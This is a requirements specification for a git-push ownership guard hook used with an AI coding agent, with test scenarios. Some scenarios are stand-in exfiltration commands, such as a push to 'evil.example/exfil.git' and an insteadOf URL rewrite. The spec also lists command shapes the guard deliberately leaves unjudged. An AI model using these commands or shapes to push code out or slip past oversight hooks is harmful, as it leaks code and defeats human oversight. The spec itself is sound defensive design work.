## MODIFIED Requirements

### Requirement: Owner allowlist
The ownership guards SHALL read the operator's owners from `CADENCE_ALLOWED_OWNERS` and `owner/repo` pairs from `CADENCE_ALLOWED_REPOS` in the hook process environment, each a space- or comma-separated list matched case-insensitively. A bare entry MUST match only the default host (`GH_HOST`, else `github.com`) and hosts in `CADENCE_EXTRA_HOSTS`. A host-qualified entry (`host/owner`) MUST match only its own host. An inline prefix on the command MUST NOT change a verdict.

#### Scenario: Bare entry on the default host
- **WHEN** `CADENCE_ALLOWED_OWNERS=cameronsjo` and a push targets `https://github.com/CameronSjo/tool.git`
- **THEN** the target counts as owned

#### Scenario: Bare entry on a self-hosted forge
- **WHEN** `CADENCE_ALLOWED_OWNERS=cameron`, `CADENCE_EXTRA_HOSTS` is unset, and a push targets `https://git.example.com/cameron/tool.git`
- **THEN** the push nudges, and the nudge suggests qualifying the entry as `git.example.com/<owner>` or setting `CADENCE_EXTRA_HOSTS=git.example.com`

#### Scenario: Repo entry
- **WHEN** `CADENCE_ALLOWED_REPOS=external/shared-repo` and a write targets `external/shared-repo`
- **THEN** the target counts as owned while every other `external/*` repo does not

### Requirement: Push to a repository the operator does not own
`guard-push-remote` (PreToolUse, Bash) MUST NOT block. It SHALL nudge (exit 0, `Push target is not on your allowlist`) on a `git push` whose remote it read exactly and whose owner is outside the allowlist: an explicit URL directly, a named remote through git's push URL, a bare push through the tracking remote, each in the directory the push walk followed (`cd <dir> &&`, `git -C <dir>`, `bash -c`). The nudge SHALL name the remote, the directory and the allowed entries, and SHALL say to confirm the remote or push to the fork. A push whose targets are all owned, and a command with no push, SHALL be allowed with no output.

#### Scenario: Ordinary push to an owned remote
- **WHEN** `git push origin feat/x` runs in a checkout whose `origin` is an owned GitHub repo
- **THEN** the hook exits 0 with no output

#### Scenario: Push to an unowned URL
- **WHEN** the command is `git push https://github.com/someone-else/repo.git main`
- **THEN** the hook exits 0 with a nudge that names the URL, the directory and the allowed entries, and says to confirm the remote or push to the fork

#### Scenario: Push text that is not a push
- **WHEN** the command is `git commit -m "remember to git push https://github.com/x/y.git"`
- **THEN** the hook allows with no output

#### Scenario: Chained pushes to owned remotes
- **WHEN** the command is `git push origin main && git push backup main` and both remotes are owned
- **THEN** the hook allows, each push judged on its own target

### Requirement: Push guard configuration and probe failures
`guard-push-remote` SHALL allow with no output when `CADENCE_ALLOWED_OWNERS` is empty, when the push runs in a directory that is not a git repository, and when a git probe exceeds the git-probe deadline (`CADENCE_HOOK_DEADLINE_MS`). It SHALL resolve at most four distinct directory and remote pairs per command and SHALL NOT judge the pushes past them.

#### Scenario: Unconfigured machine
- **WHEN** `CADENCE_ALLOWED_OWNERS` is unset and the command is `git push origin main`
- **THEN** the hook exits 0 with no output

#### Scenario: Not a repository
- **WHEN** an owner list is set and `git push origin main` runs in a directory with no git repository
- **THEN** the hook allows

#### Scenario: Probe timeout
- **WHEN** every git probe outlives the deadline and the command is `for x in 1; do git push r1 main; git push evilremote main; done`
- **THEN** the hook exits 0 with no output

### Requirement: Push after an eval of text built at run time
`guard-push-remote` SHALL judge a push after an `eval` whose script is built at run time (`eval "$S"`, `eval "$(direnv export bash)"`) in the directory it read. When something it read may move the push (the `eval`'s words name `cd`, `pushd`, `popd` or `eval`, or hold a backslash, a variable the command names, or an expansion other than `$NAME`, `${NAME}` and `$(…)`; or the command defines a function, may replace a tool, or names a `GIT_` variable), and after a literal `eval`, it SHALL allow with no output.

#### Scenario: direnv line in an owned checkout
- **WHEN** the command is `eval "$(direnv export bash)"; git push origin feat` in a checkout whose `origin` is owned
- **THEN** the hook exits 0 with no output

#### Scenario: direnv line in an unowned checkout
- **WHEN** the command is `eval "$(direnv export bash)"; git push origin feat` in a checkout whose `origin` is not owned
- **THEN** the hook exits 0 with a `Push target is not on your allowlist` nudge

#### Scenario: A variable the command names
- **WHEN** the command is `S='cd /other'; eval "$S"; git push origin feat` in an unowned checkout
- **THEN** the hook exits 0 with no output

#### Scenario: A literal eval
- **WHEN** the command is `eval 'echo hi'; git push origin feat` in an unowned checkout
- **THEN** the hook exits 0 with no output

### Requirement: Protected ownership guards
`CADENCE_DISABLE` MUST NOT switch off `guard-gh-write` or `guard-gh-dangerous`: the name is reported as refused and the guard still runs. `CADENCE_BYPASS=1` SHALL switch them off. `guard-push-remote`, `guard-forge-write`, `inject-gh-write-context`, `guard-git-init` and `warn-going-public` SHALL honour `CADENCE_DISABLE`. Every hook here SHALL run unchanged under `CLAUDE_CODE_REMOTE=true`.

#### Scenario: Disable refused
- **WHEN** `CADENCE_DISABLE=guard-gh-write` and the command writes to an unowned repo
- **THEN** the write still blocks

#### Scenario: Push nudge switched off
- **WHEN** `CADENCE_DISABLE=guard-push-remote` and `guardrails guard-push-remote` runs
- **THEN** it exits 0 without reading stdin

## ADDED Requirements

### Requirement: Pushes the push guard does not judge
`guard-push-remote` SHALL allow with no output a push whose remote it did not read exactly (cadence-ecosystem ADR-0046 rule 3): a target or directory the shell builds at run time, a redirected or wrapped push, a `-c` override, a bare push after a possible branch switch, a URL with no `owner/repo`, or a remote git cannot resolve.

#### Scenario: Variable remote
- **WHEN** the command is `git push "$REMOTE" main` in an unowned checkout
- **THEN** the hook exits 0 with no output

#### Scenario: Variable directory
- **WHEN** the command is `cd "$REPO" && git push origin main` in an unowned checkout
- **THEN** the hook exits 0 with no output

#### Scenario: Rewritten push URL
- **WHEN** the command is `git -c url.https://evil.example/.insteadOf=https://github.com/ push origin main`
- **THEN** the hook exits 0 with no output

#### Scenario: Bare push after a branch switch
- **WHEN** the command is `git checkout other && git push` in an unowned checkout
- **THEN** the hook exits 0 with no output

#### Scenario: URL with no owner
- **WHEN** the command is `git push https://evil.example/exfil.git main`
- **THEN** the hook exits 0 with no output

## REMOVED Requirements

### Requirement: Push shapes the push guard refuses
**Reason**: cadence-ecosystem ADR-0046 rule 3: a guard does not refuse a command for being hard to read, and phase 2 makes `guard-push-remote` a nudge (cameronsjo/cadence-hooks#1443).
**Migration**: None. Each shape now allows with no output, as "Pushes the push guard does not judge" says.

### Requirement: How many pushes the push guard checks
**Reason**: The caps refused a command for its size. A nudge-only guard has nothing to refuse.
**Migration**: The probe cap in "Push guard configuration and probe failures" replaces them; pushes past it are not judged.

### Requirement: Literal `git -C` push loops
**Reason**: The per-iteration reading existed to lift the loop caps, which are removed.
**Migration**: None. Each push in a loop is judged where the push walk places it.

### Requirement: Push directory or target built at run time
**Reason**: Both nudges named a guess, not a remote the guard read.
**Migration**: None. Such a push allows with no output, as "Pushes the push guard does not judge" says.

### Requirement: Pushes in a chain or loop the parser cannot read
**Reason**: `guard-push-remote` no longer uses the loop parser.
**Migration**: None.

### Requirement: Nudges for pushes in a chain or loop the parser cannot read
**Reason**: `guard-push-remote` no longer uses the loop parser.
**Migration**: None.

### Requirement: Unparsed push nudges say which branch a bare push was checked on
**Reason**: `guard-push-remote` no longer uses the loop parser, and a bare push after a possible branch switch is not judged.
**Migration**: None.
